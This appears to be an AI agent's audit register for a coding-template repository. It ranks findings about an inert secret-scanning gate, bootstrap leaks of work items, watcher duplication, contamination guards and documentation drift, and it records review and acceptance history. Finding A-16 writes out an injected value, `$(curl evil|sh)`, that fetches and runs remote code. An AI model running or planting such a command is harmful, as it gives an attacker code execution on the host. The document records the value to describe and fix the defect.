# Blueprint audit — contamination + inconsistency sweep (2026-07-23)

**Trigger:** founder-supplied diagnosis of a fork-bomb-class leak in
`scripts/agent-activity.sh`, then: *"a full review from you using fable and
codex to clean the repository from any contaminations and inconsistencies."*

**Reviewers:** 4× Fable agents (contamination · doc/rule consistency · shell
defects · bootstrap+sync) + Codex/Slava (cross-provider four-eyes, per
[AGENTS.md](../../AGENTS.md) and commit `873c560`). Findings below are
**deduplicated** across reviewers; the `Confirmed` column records whether I
verified the claim myself rather than relaying it.

> ## `A-NN` is a finding ID, not a work item
>
> The `A-NN` numbers in this document identify **findings from this one sweep** —
> the same category as a Codex finding ID. A finding is a claim that something is
> wrong. It becomes *work* only when it gets a `BUG-XXX` / `FEATURE-XXX` number,
> which is what the commit convention, the regression-test naming rule and the
> lifecycle folders all key off (CLAUDE.md §"Bug Management").
>
> They were being used as though they were work items — folder names, rows in
> `doing/BUGS.md`, pre-push comments — and then extended with fresh numbers
> (`A-38`, `A-39`) for findings that had nothing to do with this audit. Live items
> were renumbered on 2026-07-30: `A-22` → **BUG-004**, `A-38` (+`A-39`) →
> **BUG-005**, `A-08` → **BUG-006**.
>
> **This document and everything in `done/` keep their `A-NN` IDs.** The Codex
> review documents argue about findings by name ("A-07 R4-F2"), so renaming them
> would break the argument trail they exist to preserve. Treat an `A-NN`
> reference anywhere as a citation of history. If you are about to work on one,
> give it a `BUG-`/`FEATURE-` number first.

**Fix status (authoritative) — updated by the 2026-07-29 QA acceptance pass.**

**DELIVERED + QA-ACCEPTED.** Acceptance for this class of work is delegated to
QA-2 (founder decision 2026-07-29; scope and limits in `project_config_dod.md`
§"Acceptance authority"), and every verdict carries executed evidence rather
than inspection. Records in [`../done/`](../done/):

- **2026-07-24** — **A-01**, **A-05**, **A-12**, **A-14**, **A-15**, **A-27**,
  **A-36**, plus **BUG-001** and **BUG-003**.
- **2026-07-29** — **A-03** (secret gate), **A-07** (a2bp contamination guard),
  **A-09** (cross-project log contamination) and **BUG-002**. Record:
  [`../done/ACCEPTANCE-JESKO-2026-07-29.md`](../done/ACCEPTANCE-JESKO-2026-07-29.md).

**A-02** is closed (scanners installed).

**A-22 was REJECTED on 2026-07-29** and is reopened in
[`../done/BUG-004-gate-arming/`](../done/BUG-004-gate-arming/) — see below.

> **Jesko's explicit caveat, recorded so it is not lost:** accepting these seven
> is **not** acceptance of **A-22**. The gate that protects them is armed on this
> machine only; a fresh clone is still ungated. A-22 is a separate delivery
> promise and stays open below.

> **A-22 UPDATE (2026-07-29) — REJECTED at acceptance, and the gap is now
> REPRODUCED rather than reasoned.** QA-2 created a fresh clone, committed a
> newly generated high-entropy token, redirected `origin` to a throwaway bare
> repo, and executed a real push without ever running the feed or drift:
> `fresh_clone_hooksPath=UNSET`, `real_ungated_push_rc=0`,
> `secret_commit_reached_destination=yes`. So the A-03 secret gate is real
> **and** it is not a property of a clone; both are true. **A-22 needs a founder
> decision, not more local code** — see the reopened folder. The 2026-07-24
> account below stands as the history of the attempted fix.
>
> **A-22 UPDATE (2026-07-24) — fix implemented, NOT yet accepted.** Jesko's
> caveat above is now addressed in code: `arm_gate` (`scripts/lib/gate.sh`) is
> called from the two paths that already run at wake (the activity feed and
> `blueprint drift`), so a fresh clone arms itself instead of relying on a
> `postinstall` that never existed. Pinned by `tests/gate-arming/` (11 cases),
> wired into the pre-push gate and CI. **Residual gap, stated rather than
> hidden:** this covers the agent wake paths. A human who clones and pushes
> without ever starting the feed or running drift is still ungated — git has no
> clone hook. The gap is not closable **by another local hook** — a pre-push
> hook is advisory by construction (repo-local, absent on a clone, `--no-verify`
> defeats it), so local tooling is fast feedback and enforcement is server-side.
> Server-side enforcement **is available** here at the policy/workflow cost set
> out in **A-37** §4c; it is simply not configured today.
> A-22 therefore moves to `waiting-acceptance/` on push, **not** to `done/`.
> *(That prediction held: it was rejected at acceptance on 2026-07-29 and is
> now back in `doing/`.)*

**STILL OPEN — everything else in the register below.** The live ones:

- **A-22** → tracked as **[BUG-004](BUGS.md)**. **REOPENED (rejected at
  acceptance).** Needs a founder decision on server-side enforcement (the option
  costed as **A-37** §4c), not another local mechanism. Details above.
- **A-08** → tracked as **[BUG-006](BUGS.md)**. **NEXT.** `LWA_FEED_*` in
  `scripts/log-activity.sh`: BUG-002's contamination in env-var-namespace form.

Two findings raised on 2026-07-30 do **not** belong to this audit and were
briefly misfiled into its numbering as `A-38`/`A-39`. They are
**[BUG-005](BUGS.md)** — the pre-push gate at its 30 s ceiling, and the coverage
it has already displaced.

Closed in the "guard the pipe" order, kept here for traceability:

- ~~**A-07**~~ — **ACCEPTED 2026-07-29 by QA-2 (delegated).** `blueprint a2bp` no longer
  copies with a bare `cp`. It scans **every staged line with no
  alignment-derived exemption** (explicit `a2bp-allow` suppressions and
  `--force` remain operator overrides) and **round-trip verifies** staging:
  forward-substituting both staged output and the project file must produce
  byte-identical results. A misattributed placeholder restoration therefore
  cannot change the file's meaning under substitution. Blocks host paths /
  foreign state dirs / residual names.
  Regression `tests/a2bp-contamination/` (41 assertions, gate-wired). Codex
  four-eyes rejected **six** successive cuts and returned CLEAN on the seventh;
  record in [`../done/A-07-a2bp-guard/`](../done/A-07-a2bp-guard/).
  It also surfaced a pre-existing `pull` defect: project names containing `&`
  or `\` were silently mangled by the interpolated `sed`, independent of a2bp.
- ~~**A-03**~~ — **ACCEPTED 2026-07-29 by QA-2 (delegated), pushed `b89e7a4`, four-eyes CLEAN on round 11.** The secret gate scanned
  an index that is always empty at pre-push time; now scans `remote..local`
  per ref (pushed `1c4dd4c`). **That push went out BEFORE four-eyes**, and the
  review then found a real hole in it: the new-branch selector `--not
  --remotes` subtracts *every* configured remote, so a commit already on a
  private mirror is skipped when first disclosed to a public one.

  Scoping that to `--remotes=<destination>` was the **second** wrong answer and
  was rejected in turn — it is only a namespace selector over
  `refs/remotes/<dest>/*`, never an answer from the destination, so a
  stale-ahead or phantom local ref under-scans. **A new ref is now scanned in
  FULL, subtracting nothing**; updated refs keep `remote..local`, where the old
  sha comes from git on stdin and is authoritative. The full scan is bounded by
  one per-push deadline (`GITLEAKS_TIMEOUT_SECONDS`, default 20) with a
  required `timeout`/`gtimeout` provider, and an unfinished scan blocks as
  INCOMPLETE. Regressions #7/#7b/#8/#9/#10/#11, mutation-verified.
  Record: [`../done/A-03-secret-gate/`](../done/A-03-secret-gate/).
- ~~**A-09**~~ — **ACCEPTED 2026-07-29 by QA-2 (delegated).** Feed and all
  dispatchers derive one per-project state dir via `scripts/lib/state-dir.sh`;
  the Sonar-key half fixed at bootstrap. BUG-002 was accepted with it.

---

## 1. Ranked register

Severity: **S1** = actively harmful now · **S2** = ships broken behaviour to
every derived project · **S3** = correctness/doc drift · **S4** = hygiene.

| ID | Sev | Where | Finding | Confirmed |
|---|---|---|---|---|
| **A-01** | S1 | `.claude/settings.json:151` | `Read(//home/luiz/.vscode/**)` — a host path in the committed settings file trips the repo's **own** host-path guard at `.githooks/pre-push:209`. The blueprint could not push itself. Added automatically by permission prompts **during this session**. | **Me — verified guard fails, then fixed** (moved to gitignored `settings.local.json`; guard passes, JSON valid) |
| **A-02** | S1 | host / `.githooks/pre-push:27-90` | **The entire pre-push security gate is inert on this machine.** `gitleaks`, `semgrep`, `osv-scanner`, `trivy` are all absent, and each step is `if command -v … else warn && skip`. Every security scan prints "⚠ skipped" and the gate passes. CLAUDE.md §Security claims "gitleaks **blocks** the push". | **Me — ran the probe; all 4 missing** |
| **A-03** | S1 | `.githooks/pre-push` | **ACCEPTED 2026-07-29 by QA-2 (delegated). Pushed `b89e7a4`, four-eyes CLEAN on round 11.** Even **with** gitleaks installed, `gitleaks protect --staged` scanned the *index*, which is empty at pre-push time (commit already made), so the secret gate was a no-op in the normal commit-then-push flow — it could only ever fire for someone who staged a secret and pushed without committing. **Now empirically confirmed rather than reasoned:** with a real detectable secret in the outgoing commit, `protect --staged` reported "0 commits scanned, ~0 bytes … no leaks found" (rc 0) while `detect --log-opts` reported "leaks found: 1" (rc 1). Fixed by reading git's ref lines from the hook's stdin and scanning `remote..local` per ref; a deletion is not scanned, and a run with no stdin falls back to `@{u}..HEAD` or `--all` rather than silently skipping. A **new ref is scanned in FULL, subtracting nothing** — `--not --remotes` (every remote) and then `--not --remotes=<destination>` were both tried and both rejected in review, because local tracking refs are a namespace, never an answer from the destination, so a stale-ahead or phantom ref under-scans. The full scan is bounded by **one deadline per push** (`GITLEAKS_TIMEOUT_SECONDS`, default 20) with a **required** `timeout`/`gtimeout` provider; an unfinished scan blocks as INCOMPLETE, distinct from both a finding and a crashed scanner. BUG-003's finding-vs-tool-failure split preserved. Regression `tests/pre-push-secrets/` (11 cases; #9/#10 CI-only by cost) plus an end-to-end run against the real gitleaks. **Eleven review rounds; the first fix reached `origin` as `1c4dd4c` before four-eyes and the review then found a real hole in it.** Record: [`../done/A-03-secret-gate/`](../done/A-03-secret-gate/). | Fable; **now verified by me with a real leak** — the first probe used `AKIAIOSFODNN7EXAMPLE`, which gitleaks allowlists by design, and would have "confirmed" the opposite |
| **A-04** | S1 | `scripts/start-all-watchers.sh:10-32`, `scripts/codex-signal-watch.sh` | **No instance guard anywhere in the watcher stack** — `nohup … &` unconditionally, no pidfile, no flock, no reaper. Run it twice → two `codex exec --sandbox workspace-write` fire on one mic flip. **Ranked correctly (2026-07-29): concurrent writes to one working tree FIRST** — two sandboxed processes editing the same files is a correctness defect under any billing model — and duplicated runs second. *This row previously led with "2× billable LLM spend"; that half is **false for this checkout**. `~/.codex/auth.json` has `auth_mode: chatgpt`, i.e. subscription auth, so a duplicate dispatch burns quota and produces no incremental invoice.* The claim came from the same framing redcare inherited from us and repeated for three days before checking (their 2026-07-29 board message); it is corrected on both sides now. Re-price the spend half only if this host ever moves to an API key. | **Me — read both files; confirmed zero guard; auth mode verified 2026-07-29** |
| **A-05** | S1 | `scripts/new-project.sh:63-67` + `:132` | Bootstrap copies the **whole working tree** (`find … \| cp -R`, everything but `.git`) then `git add -A && git commit`. Untracked + gitignored files are copied into every derived project. Two distinct hazards: **confidentiality** — a `.env` holding `SONAR_TOKEN` is copied into the derived working tree (not *committed* — the copied `.gitignore` travels — but a secret in another tree is already a leak); and **history** — the blueprint's own *tracked* `docs/doing/` work items are not gitignored, so they are copied *and committed*, and a fresh project opens with the blueprint's active bugs as its own. *(Corrects this row's earlier "`.env` would be copied and committed" — per Codex R-1, `.env` is copied, not committed; the committed leak is the tracked work items.)* | **Me — read the copy loop and the commit** |
| **A-06** | S2 | `scripts/agent-activity.sh:60`, `start-copilot-signal-watch.sh:15,18` | `stat -f %m F \|\| stat -c %Y F` is broken on GNU: `stat -f %m` exits 1 **but still prints a multi-line filesystem block to stdout**, and `$(a \|\| b)` captures **both**. The "mtime" is a blob containing live `Free:`/`Available:` block counters, which change constantly → the change-detector fires forever. | **Me — reproduced; this is the root cause of the duplicate `[User] IDLE` lines I saw at wake and could not explain** |
| **A-07** | S2 | `scripts/blueprint` (`cmd_a2bp`) | **ACCEPTED 2026-07-29 by QA-2 (delegated).** `a2bp` copied a project's file into the blueprint with **no reverse-substitution and no contamination scan** — bare `cp`. This is **the mechanism that created BUG-002** (`~/.linkedin-watcher-agent` back-propagated into the generic script) and A-09. It also destroyed `{{PROJECT_NAME}}` tokens, so one project's name fanned out to all others on their next pull. **Shipped design (round 7, after six rejections — read this, not the history below):** `scripts/lib/contamination.sh` restores placeholders where a positional diff against the blueprint's copy makes them attributable, but **nothing safety-critical rests on that attribution**. The scan checks **every staged line with NO alignment-derived exemption** (explicit per-line `a2bp-allow` suppressions and the loud `--force` override remain), and staging is **round-trip verified** — forward-substituting both the staged output and the project file must produce byte-identical results or staging fails closed. Forward substitution is ONE shared literal primitive (`scripts/lib/placeholders.sh`) used by `pull`, `drift` and the verifier, so the three cannot disagree; it also closed a **pre-existing `pull` defect** where a project name containing `&` or `\` was silently mangled. Blocks on host home paths / literal per-project state dirs / residual project names. **Codex four-eyes R1 rejected the first implementation and was right on both counts:** a global `sed` inverse silently corrupted prose for one-word project names (project `blueprint` → every occurrence of the word rewritten to `{{PROJECT_NAME}}`, copied through with no finding) and interpolated the name unescaped as a regex; and the Markdown/prose exception was dead in production because `cmd_a2bp` scanned an extensionless `mktemp` path while the unit tests called the helper directly with a real `.md` path. The logical path is now passed separately from the content path. **Codex R2 then rejected the second cut too**, and was right again: keying provenance on line CONTENT still discards occurrence identity (a blueprint holding both `{{PROJECT_NAME}}` and a literal `acme-flow` line rewrote *every* matching project line), and a content-keyed exemption let a duplicated/relocated risky line bypass every check. Both fixed by replacing content lookup with positional `diff` alignment. **R3 and R4 then rejected that too** — an LCS match is not edit history, and any finite context window can be relocated as a unit — which is what forced the shipped design above: stop inferring provenance and make safety independent of it. **R5 found three substitution implementations that disagreed** (the `&`/`\` mangling) and that the "never introduces project-specific bytes" contract was overclaimed; **R6** found the two-token pipeline re-scanning its own output and NUL-bearing files being silently truncated. Emails are a non-blocking NOTICE — calibrated against all 48 managed files, where the only ambiguous hit is legitimate (the founder's address in the deck), and a check that blocks a legitimate line trains the operator to reach for `--force` by reflex. `A2BP_PLAYBOOK.md` now opens at "Step A0 — the contamination guard". Regression `tests/a2bp-contamination/` (**41 assertions**, gate-wired; cases #6, #16, #17 verified red on their parent). | Fable ×2 (one verified live: a file with `$HOME/.acme-flow` copied in with zero warning) |
| **BUG-002** | S2 | `scripts/agent-activity.sh:8,9,16,26` | Hardcodes `LINKEDIN_WATCHER_AGENT_HOME` / `~/.linkedin-watcher-agent` while its siblings correctly use `~/.{{PROJECT_NAME}}`. Consequence is worse than "wrong path": the `[CODEX]`/`[GEMINI]` lines — the feed's flagship feature — **never appear** in any derived project, silently. | **Me + all reviewers** |
| **A-08** | S2 | `scripts/log-activity.sh:16,26,27,46` | `LWA_FEED_MAX_LINES` / `LWA_FEED_KEEP_LINES` / `LWA_FEED_LABEL` — "LWA" = LinkedIn Watcher Agent. BUG-002's contamination in env-var-namespace form. | **Me — grepped** |
| **A-09** | S2 | `scripts/new-project.sh:72-94` | **ACCEPTED 2026-07-29 by QA-2 (delegated).** Both halves closed. Dispatcher/state-dir half pushed `1a876c8`: feed + all three dispatchers derive `~/.<repo-name>` at runtime through the shared `scripts/lib/state-dir.sh` (no more literal `~/.{{PROJECT_NAME}}/`; verified live after a redcare BUG-013 verdict bled into this feed — regression `tests/state-dir/test.sh`, gate-wired). SonarQube half: `sonar-project.properties` and `scripts/start-gemini-signal-watch.sh` added to `new-project.sh` TARGETS, so each derived project gets a unique Sonar key + a substituted Gemini prompt instead of the shared literal `{{PROJECT_NAME}}` — regression in `tests/bootstrap-contents` (derived-tree grep). Note: `sonar-project.properties` is a TEMPLATE_FILE (bootstrapped, project-owned, **not** pull-synced), so bootstrap substitution is the complete fix — pull neither heals nor re-breaks it; no pull-path change needed. CLAUDE.md's "bootstrap substitutes sonar" claim is now true. | Fable ×3, independently; **me — grepped TARGETS** |
| **A-10** | S2 | `scripts/codex-signal-watch.sh:114` | `last_trigger_key=""` at startup → the watcher fires immediately if `State` **already** equals the target. That is **implicit backlog replay with no opt-in flag** — a direct violation of CLAUDE.md §Cost capability #4, the exact rule written after the $10 linkedin-watcher incident. | Fable |
| **A-11** | S2 | `scripts/blueprint:177-218` | Marker merge validates marker **count only, not order**. Verified live: `END` before `BEGIN` passes the check and the awk **silently deletes** all project content after the BEGIN — while printing "project outside-marker content preserved". | Fable (verified live in a scratch repo) |
| **A-12** | S2 | `scripts/blueprint:53` | `AGENT_ROSTER.md` is in `MANAGED_FILES` but is documented as "the DEFAULT — each team **edits it**", and carries no markers. Any team that customises its roster is flagged as drifted forever, and `pull --yes` **silently resets the team** back to Sylvia & co. | Fable |
| **A-13** | S2 | `.gitignore:29-33,86-88` | The PUBLIC-PUBLISHING PRIVACY BLOCK (what stops CLAUDE.md/AGENTS.md leaking to public GitHub) says "Do NOT edit between the blueprint markers — they'd come back on next sync", but `.gitignore` is **not** in `MANAGED_FILES` and has **no** markers. Fixes to the privacy block never propagate. | Fable |
| **A-14** | S2 | `scripts/new-project.sh:129-130` | Hardcodes `luiz@struct2flow.com` / `Luiz Scheidegger` as repo-local git identity in **every** bootstrapped project, for any operator. | **Me — read it** |
| **A-15** | S3 | `tests/marker-merge/test.sh` | The blueprint's **only** test is wired into **no gate**. The repo has no `backend/`/`frontend/`, so its own pre-push runs **zero tests** — a regression to the merge logic (A-11) pushes green. Also confirms PLAN-BUG-001 §7. | **Me + Fable ×2** (test itself passes: `PASS … EXIT=0`) |
| **A-16** | S3 | `scripts/sonar.sh:30`, `sonar-api.sh:25` | `eval "$(grep -E '^SONAR_…' .env)"` — a config file becomes a code-execution surface (`SONAR_TOKEN=abc $(curl evil\|sh)`), run unattended on `npm run sonar`. | Fable |
| **A-17** | S3 | `.githooks/pre-push:154` | `ls infra/**/*.tf` under `#!/bin/sh` — no globstar, so `infra/envs/prod/main.tf` never matches and the **IaC gate silently skips**. | Fable |
| **A-18** | S3 | docs ↔ code | **Feed opens a Terminal**: `AGENTS.md:28,245` + `CLAUDE.md:38` say it does; `agent-activity.sh:39-41` says auto-open was removed. `AGENT_FEED_NO_TERM` documented but unused. | Codex; **me — read both sides** |
| **A-19** | S3 | docs ↔ docs | **No single executable wake order**: `AGENTS.md` says signal→AGENTS→CLAUDE; `DoD.md §10` + `HANDOVER.md` say HANDOVER first; `CLAUDE.md` says persona+feed "before anything else". | Codex |
| **A-20** | S3 | docs ↔ code | **Handoff identity contradicts the dispatchers**: protocol requires `Holder` = roster persona, but both launchers instruct agents to return `Holder=Claude Code` — the exact same-type collision the roster exists to prevent. | Codex |
| **A-21** | S3 | `.githooks/pre-push` vs `DoD.md §4` | Documented gate order omits the real stages (security runs first, IaC after tests). And the hook is **not** universally blocking as advertised — see A-02. | Codex |
| **A-22** | S3 | `CLAUDE.md`/`.githooks/pre-push` | **REJECTED at acceptance 2026-07-29 — REOPENED.** QA-2 reproduced the gap: fresh clone, real token committed, real push executed without feed or drift, `real_ungated_push_rc=0`, `secret_commit_reached_destination=yes`. Needs a founder decision on server-side enforcement, not another local hook. Prior fix, which stands as far as it goes: `arm_gate` (`scripts/lib/gate.sh`) arms `core.hooksPath` from the two paths that already run at wake (the feed + `blueprint drift`); regression `tests/gate-arming` gate-wired; R11 closed — the scanner fixture now isolates the `osv-scanner` probe with a hostile-PATH positive control (`tests/pre-push-scanners` case #0). Cleared 8 four-eyes rounds (R2–R8, records in `waiting-acceptance/`). Original defect: claimed `postinstall` auto-wires `core.hooksPath` (in `CLAUDE.md` + the hook header, **not** `AGENTS.md`); the template has no root `package.json`, so a clone had no auto-wire path. | Codex |
| **A-23** | S3 | `scripts/blueprint:341-351` | Under `set -euo pipefail`, a missing line in `.blueprint-source` aborts the whole script **with no output** — the mandatory wake-time `blueprint drift` exits 1 silently. An unattended agent may read that as "no drift". | Fable |
| **A-24** | S4 | `scripts/team-kickoff.sh:18-24` | Default persona intros own **another product's** surface ("the editor", "the v2 pipeline", "share/login surfaces") rather than the roster's generic roles. | Fable |
| **A-25** | S4 | `scripts/build-deck.sh:32` | `npx -y @marp-team/marp-cli@latest` — unpinned remote code executed on every deck rebuild, in an agent-automated step, bypassing the pin-and-scan doctrine the blueprint enforces elsewhere. | Fable |
| **A-26** | S4 | `HANDOVER.md`, `README.md`, `AGENTS.md` | Doc rot: HANDOVER cites "DoD §11" (continuity is §10); README claims bootstrap substitutes placeholders (false per A-09) and runs npm init (it prints a message); AGENTS.md claims the baton stays a "slim four-row" file while the Task cell now carries whole dispatch prompts. | Codex |

### 1b. Doc/rule consistency cluster

| ID | Sev | Where | Finding | Confirmed |
|---|---|---|---|---|
| **A-27** | S1 | `.gitignore:68-70` vs `docs/PUBLISHING.md:39-44` | PUBLISHING.md says `project_config_*.md` (all five) must be ignored before a public push. `.gitignore` lists **only three** — omitting `project_config_security.md` (**threat model, adversary assumptions, incident playbook**) and `project_config_infra.md` (**account IDs, state backends**). Both are tracked. On a derived project's first public push, **the two most sensitive files go public.** | **Me — confirmed both tracked, both absent from `.gitignore`** |
| **A-28** | S2 | `project_config_dod.md:56-64` + `.githooks/pre-push:102` | The template every project inherits ships **the exact anti-pattern CLAUDE.md forbids**: `brownfield → ≥70%` (canon: ratchet from the current true number, no 70% anywhere) and `include: src/application/**, src/domain/**` / `exclude: src/adapters/**` — verbatim the "subset-metric trap" CLAUDE.md §Coverage calls out by name. The hook comment repeats it. | Fable |
| **A-29** | S2 | `.gitignore:28-33` vs `.githooks/pre-push:193-217` + `DoD.md §4.5` + `scripts/blueprint:97` | `.gitignore` ignores `.claude/` wholesale, but three other sources treat `.claude/settings.json` as **committed and managed** (the host-path guard exists *because* it's committed — see A-01). In a derived project the ignore makes DoD §4.5 dead code and blocks the sync. Inert in the blueprint only because the file is already tracked. | **Me — `git check-ignore` confirms the split** |
| **A-30** | S3 | `AGENT_SIGNAL.md:8`, `AGENTS.md:87`, `HANDOVER.md:3`, `DoD.md:11-14` | **Numbering rot on the most-cited gate in the repo.** Two files point at `§A–§G`; the checklist is **A–H** (CLAUDE.md:67 has it right). The omitted **§H is "Self-audit"** — the step that would catch the exact `ls docs/waiting-acceptance/` mismatch those same sentences quote inline. Plus: HANDOVER cites "DoD §11" (continuity is §10); DoD's own intro says "§8 is the checklist" (it's §7). | **Me — verified all four** |
| **A-31** | S3 | hook vs DoD §6.2 vs CI vs `project_config_dod.md` | **osv-scanner threshold differs four ways**: hook blocks on *any* finding (making its own "track lower-severity in findings.md" advice unreachable), DoD + SECURITY.md say HIGH+, CI says MEDIUM+ (the newest deliberate decision, `227f897`), project_config_dod documents flags the hook doesn't use. | Fable |
| **A-32** | S3 | `project_config_overview.md` | CLAUDE.md mandates mechanism rows in §"Security stack", §"Infra stack", §"Code quality stack"; `security.yml:4` cites §Security stack by name. **None of the three sections exist** in the template — only Observability, Cost, Documentation. | Fable |
| **A-33** | S3 | `docs/way-of-working.md` | Deck drift on two concerns: #4 invents "**Recipe C — third-party hosted (Sentry/Datadog)**" (real Recipe C is Containerized; STACK_DEFAULTS explicitly says "**No Sentry**") and adds EMF/X-Ray that appear nowhere; #2 says "four **founder-gated** states" (canon: parked + **three** gated — the deck's own `lcm` bullet contradicts its heading two slides later). | Fable |
| **A-34** | S4 | `README.md:209-223` | Duplicates the `MANAGED_FILES` list the script explicitly says not to duplicate — and it's stale, omitting `AGENT_ROSTER.md`, two docs, 10 of 14 scripts, `.gitleaks.toml`, and the CI workflow. | Fable |
| **A-35** | S4 | `CLAUDE.md:584` vs `:766` | CLAUDE.md contradicts **itself** on how many times the §6.4 deck rule has self-violated: "twice this week" at :584, "four times in a single week" at :766 (deck, playbook, and CLI all say four). A doc-drift rule that has drifted about its own drift count. | Fable |

**Also mine, from this session:** my live baton text in `AGENT_SIGNAL.md`
overwrote the `{{INITIAL_TASK_OR_PLACEHOLDER}}` / `{{YYYY-MM-DD}}` template
tokens. Combined with A-05, a project bootstrapped right now would wake to
"do not run the feed, pending BUG-001" — a bug that does not exist in that
repo. **Restore the template block before anything is committed.**

---

## 2. The through-line

Three findings are one story, and it is the most important output of this audit:

> **A-07** (`a2bp` has no contamination guard) is *how* **BUG-002** got into the
> blueprint. **A-15** (no test runs) is why nothing caught it. **A-02/A-03**
> (security gate inert) is why nothing would catch the next one either.

The blueprint's stated doctrine — back-propagate proven patterns, gate on tests,
scan on push — is **structurally unenforced**. Every capability the framework
sells is real as prose and absent as mechanism. Fixing BUG-001 and BUG-002
without fixing A-07/A-15/A-02 just resets the clock until the next
back-propagation carries the next contamination up.

Recommended order, therefore: **A-01 ✓ → A-05, A-07, A-15, A-02/A-03 → BUG-001,
BUG-002 → the rest.** Guard the pipe before cleaning the water.

---

## 3. BUG-001 consensus: Codex withheld it, and was right

Full review: [CODEX-REVIEW-BUG-001.md](../done/BUG-001-fork-bomb/CODEX-REVIEW-BUG-001.md)
(it travelled to `done/` with BUG-001). It validated
the RCA (including my correction to the founder's diagnosis re: the losing
racer) but found three genuine holes in **my** fix design:

1. **F-1 and F-4 contradict each other.** `exec 9>lock` leaves FD 9
   inheritable; surviving children keep the lock held after the leader is
   SIGKILLed, so the next invocation loses `flock` and **never reaches** the
   orphan sweep that was supposed to make SIGKILL recovery converge.
2. **`trap 'kill 0' INT TERM EXIT` is unsafe** — `kill 0` signals the shell
   executing the trap, re-entering traps and making exit status
   nondeterministic.
3. **My bounded pool silently loses product data.** Evicting the oldest of 8
   tails can drop an agent that is *still active but quiet*, and since the path
   stays in `.subagent-seen` it never reattaches. Idle-mtime is not a
   completion signal — an agent can think for >10 min.

It also caught a **false claim of mine**: I wrote that F-3's three layers were
"each independently sufficient to keep the count constant." They are not —
expiry and timeout bound *lifetime*, not *concurrency*. Only the pool cap
bounds instantaneous count.

**Its counter-proposal is better than mine and I accept it:** a single
supervisor tracking a **byte-offset per transcript**, reading appended bytes
itself. No process per file; attribution is free (the supervisor knows which
file it read); no eviction of quiet agents. It also answers C-5 the way I'd
now argue it — the wake protocol should say *"ensure the feed is running"*,
not *"run the feed"*.

PLAN-BUG-001 must be revised to that design before implementation is
authorized. A-06 (the `stat` blob) is a **second, independent** defect in the
same file that the plan does not currently cover and must.

---

## 3b. Founder decisions (2026-07-23) — and what shipped

| Q | Decision | Status |
|---|---|---|
| Fix order | **Accepted "guard the pipe first"** (A-05 bootstrap copy, A-07 a2bp scan, A-15 test wiring, A-02/A-03 scanners) before BUG-001/BUG-002. | Order adopted; pipe work not yet started |
| A-14 git identity | **Inherit from `git config --global`** — do not bake a person in. | **DONE** |
| A-12 `AGENT_ROSTER.md` | **Treat it like `.env`** — tracked example, gitignored per-engineer copy. Backing agents open-ended (teammates may run Qwen, or not run Codex at all). | **DONE** |
| Scope | Write an explanation of the findings to `../redcare/rdc-agenticcoding-blueprint`. | **DONE** — `docs/doing/INHERITED-AUDIT-2026-07-23.md` there, with every finding **re-verified against that repo** rather than copied |

### A-14 — implemented

`new-project.sh` no longer writes `user.email`/`user.name`. It now fails early
with actionable instructions if no identity is configured (rather than letting
`git commit` die on "Author identity unknown"), and echoes `🖋 Committing as:
…` so the identity is visible at the moment it is used.

`STACK_DEFAULTS.md` §"Git author identity" rewritten. **The deleted hardcoding
existed for a real reason** — it stopped a work email (`*.ext@<employer>.de`)
from landing in personal project history and creating IP-assignment ambiguity.
Inheritance makes that the *default* outcome, so that protection is now an
explicit operator instruction plus the bootstrap echo, with the recommendation
to set the **personal** identity globally and override repo-locally for work
repos (so forgetting costs you a work repo with a personal email, not published
personal history carrying an employer address).

> ⚠ **Action required:** `~/.gitconfig` has **no `[user]` section**, and this
> repo has no local one either — verified. With the hardcoding removed,
> `new-project.sh` will now stop with its instruction message until you set one.
> Independently and pre-existing: **this repo cannot commit right now** for the
> same reason (`git var GIT_AUTHOR_IDENT` → "Author identity unknown"), even
> though past commits are authored `Luiz Scheidegger <luiz@struct2flow.com>`.

### A-12 — implemented

`AGENT_ROSTER.md` → `AGENT_ROSTER.example.md` (tracked, blueprint-managed) plus
a gitignored per-engineer `AGENT_ROSTER.md`. Changed: `.gitignore`,
`MANAGED_FILES` + the a2bp Class-F hint in `scripts/blueprint`, bootstrap
seeding in `new-project.sh` (never overwrites an existing roster),
`agent-activity.sh` (`persona_label` prefers the personal copy, falls back to
the example so a fresh clone still labels personas), and the doc ripple —
`CLAUDE.md` ×2, `AGENTS.md` ×2, `README.md`, `A2BP_PLAYBOOK.md`, and the deck
slide for concern #9, per DoD §6.4.

The example's header now states that the `Backing agent` column is **free text**
— Qwen, Gemini, Copilot, anything — and that only *autonomous dispatch* requires
a matching signal watcher; an agent without one still participates in the baton
when driven manually.

Verified: example tracked + roster ignored, `persona_label` resolves
`Kathrin → Codex` from the personal copy and falls back correctly when it is
absent, `bash -n` clean on all three scripts, no stale
`[AGENT_ROSTER.md](AGENT_ROSTER.md)` links remain.

## 4. What I have NOT done

- Fixed: **A-12**, **A-14**, **A-36**. **A-01** implemented but re-opened by
  Codex round 2 (see §3b) — not closed until re-verified. **Everything else in
  §1 and §1b is untouched**, including all remaining S1s.
- **PLAN-BUG-001 revised to rev 2** around Codex's offset-supervisor design,
  with A-06 folded in — but *not implemented*; round-2 consensus pending.
- Not propagated anything to the four derived repos — all have drifted
  (13/33/120/112 lines), so each needs its own `blueprint pull` + review. The
  redcare explanation doc is written (§3b).
- **A-02 is now closed** — `gitleaks` 8.30.1, `semgrep` 1.171.0,
  `osv-scanner` 2.4.0 and `trivy` 0.72.0 are installed (no `brew` on this
  Ubuntu host, so binaries were fetched from upstream releases into
  `~/.local/bin` with published checksums verified for gitleaks and trivy;
  osv-scanner's checksum file did not match by name and is recorded as a
  sha256 in the install log; semgrep came from PyPI into an isolated venv).
- **A-03 is still open, and is now EMPIRICALLY CONFIRMED** (it was previously
  only reasoned from the source). With gitleaks installed, a full run of
  `.githooks/pre-push` on a repo with 62 commits of real history prints:

  ```
    → Secret scan (gitleaks)...
    INF 0 commits scanned.
    INF scanned ~0 bytes (0) in 3.2ms
    INF no leaks found
  ```

  **Zero bytes scanned, then "no leaks found", then the gate passes.** The
  headline security capability — "gitleaks blocks the push" — is a no-op in the
  normal commit-then-push flow, exactly as predicted. Fix: scan the outgoing
  range from the refs pre-push receives on stdin
  (`gitleaks detect --log-opts="$remote_sha..$local_sha"`). Deliberately left
  for its own change so this review's diff stays reviewable.

- **A-15 is now closed** — `.githooks/pre-push-project` created, wiring both
  `tests/marker-merge/test.sh` and the new `tests/bootstrap-identity/test.sh`
  into the gate. The blueprint repo previously ran **no tests at all** (it has
  no `backend/`/`frontend/`, which is all the generic hook knows how to run).
  Full gate now completes in **1.9 s** against the 30 s ceiling.

## 4b. A-36 (NEW) — unpinned GitHub Actions, found by the newly-installed gate

